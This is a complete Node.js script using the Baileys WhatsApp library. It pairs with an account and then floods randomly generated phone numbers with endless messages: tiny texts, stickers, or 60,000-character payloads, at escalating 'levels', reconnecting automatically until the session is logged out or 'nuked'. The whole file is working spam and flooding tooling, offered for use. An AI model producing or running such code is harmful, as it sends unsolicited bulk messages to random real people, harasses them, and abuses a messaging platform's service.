import makeWASocket, {
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  DisconnectReason,
} from '@whiskeysockets/baileys';
import pino from 'pino';
import readline from 'node:readline/promises';
import { stdin, stdout } from 'node:process';
import fs from 'node:fs';
import path from 'node:path';

const AUTH_DIR = process.env.AUTH_DIR || './auth';
const BIG = 'x'.repeat(60000);

let SAVED_PHONE = null;
let SAVED_LEVEL = null;

function randomJid() {
  const d = String(Math.floor(Math.random() * 9e11) + 1e11);
  return `${d}@s.whatsapp.net`;
}

async function ask(prompt) {
  const rl = readline.createInterface({ input: stdin, output: stdout });
  const a = await rl.question(prompt);
  rl.close();
  return a.trim();
}

let counter = 0, started = 0;
function tick() {
  counter++;
  if (counter % 500 === 0) {
    const s = (Date.now() - started) / 1000;
    process.stdout.write(`\r[sent ${counter} | ${(counter / s).toFixed(0)}/s]`);
  }
}

async function flood(sock) {
  while (true) {
    try { await sock.sendMessage(randomJid(), { text: 'x' }); } catch {}
    tick();
  }
}

async function stickers(sock) {
  const p = './assets/sticker.png';
  if (!fs.existsSync(p)) return console.warn('\n[level3] missing assets/sticker.png');
  const buf = fs.readFileSync(p);
  while (true) {
    try { await sock.sendMessage(randomJid(), { sticker: buf }); } catch {}
    tick();
  }
}

async function bigMessages(sock) {
  while (true) {
    try { await sock.sendMessage(randomJid(), { text: BIG }); } catch {}
    tick();
  }
}

async function runLevel(sock, level) {
  counter = 0;
  started = Date.now();
  if (level === 1 || level === 2) return flood(sock);
  if (level === 3) { stickers(sock); return flood(sock); }
  if (level === 4) { stickers(sock); bigMessages(sock); return flood(sock); }
  console.warn('unknown level', level);
}

async function connect(phone, level) {
  fs.mkdirSync(path.join(AUTH_DIR, phone), { recursive: true });
  const { state, saveCreds } = await useMultiFileAuthState(path.join(AUTH_DIR, phone));
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    version,
    auth: state,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
  });

  sock.ev.on('creds.update', saveCreds);

  let running = false;
  sock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
    if (connection === 'open' && !running) {
      running = true;
      console.log('\nconnected as', sock.user?.id);
      console.log(`level ${level} starting...\n`);
      runLevel(sock, level);
    }
    if (connection === 'close') {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut) {
        running = false;
        return connect(phone, level);
      }
      console.log('\nlogged out. session likely nuked.');
      process.exit(0);
    }
  });

  if (!sock.authState.creds.registered) {
    await new Promise((r) => setTimeout(r, 1500));
    const code = await sock.requestPairingCode(phone);
    console.log('\nPAIRING CODE:', code.match(/.{1,4}/g).join('-'));
    console.log('WhatsApp > Linked Devices > Link with phone number\n');
  }
}

async function main() {
  const phone = SAVED_PHONE
    || (await ask('phone (intl, no +): ')).replace(/\D/g, '');
  if (!phone) return console.error('no number');
  SAVED_PHONE = phone;

  if (SAVED_LEVEL === null) {
    const a = await ask('level (1-4): ');
    const level = parseInt(a, 10);
    if (![1, 2, 3, 4].includes(level)) return console.error('invalid level');
    SAVED_LEVEL = level;
  }

  await connect(SAVED_PHONE, SAVED_LEVEL);
}

main().catch((e) => {
  console.error('[fatal]', e?.message || e);
  process.exit(1);
});
